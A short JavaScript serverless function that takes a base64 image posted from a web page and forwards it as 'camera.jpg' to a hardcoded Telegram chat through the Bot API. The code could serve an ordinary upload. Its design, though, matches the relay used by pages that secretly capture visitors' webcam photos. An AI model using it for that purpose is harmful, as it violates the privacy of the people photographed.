
export default async (req) => {
  if (req.method !== "POST") {
    return new Response(
      JSON.stringify({ ok: false, error: "Method not allowed" }),
      {
        status: 405,
        headers: { "Content-Type": "application/json" }
      }
    );
  }

  try {
    const { image } = await req.json();

    if (!image || !image.startsWith("data:image/")) {
      return new Response(
        JSON.stringify({ ok: false, error: "Invalid image" }),
        {
          status: 400,
          headers: { "Content-Type": "application/json" }
        }
      );
    }

    const base64 = image.split(",")[1];
    const buffer = Uint8Array.from(atob(base64), c => c.charCodeAt(0));

    const form = new FormData();

    form.append("chat_id", "8622456642");

    form.append(
      "photo",
      new Blob([buffer], { type: "image/jpeg" }),
      "camera.jpg"
    );

    const token = process.env.BOT_TOKEN;

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${token}/sendPhoto`,
      {
        method: "POST",
        body: form
      }
    );

    const result = await telegramResponse.json();

    return new Response(JSON.stringify(result), {
      status: telegramResponse.ok ? 200 : 500,
      headers: { "Content-Type": "application/json" }
    });

  } catch (error) {
    return new Response(
      JSON.stringify({
        ok: false,
        error: error.message
      }),
      {
        status: 500,
        headers: { "Content-Type": "application/json" }
      }
    );
  }
};
